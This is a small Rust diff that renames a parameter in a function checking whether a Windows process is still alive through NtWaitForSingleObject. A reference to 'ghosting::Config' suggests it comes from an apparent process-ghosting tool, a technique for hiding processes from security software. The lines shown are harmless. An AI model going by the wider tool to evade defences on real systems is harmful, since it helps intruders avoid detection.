@@ -50,13 +50,13 @@ pub unsafe fn execute(config: ghosting::Config) -> bool { unsafe {
  * STATUS_TIMEOUT (0x102) = alive, STATUS_WAIT_0 (0x0) = exited.
  * */
 #[cfg(target_arch = "x86_64")]
-pub unsafe fn is_process_alive(hprocess: HANDLE) -> bool {
-    if hprocess.is_null() {
+pub unsafe fn is_process_alive(process_handle: HANDLE) -> bool {
+    if process_handle.is_null() {
         return false;
     }
     let mut zero_timeout: i64 = 0; // instant check
     let status = nt::nt_wait_for_single_object(
-        hprocess, 
+        process_handle, 
         0u8, 
         &mut zero_timeout as *mut _ as *mut c_void
     );
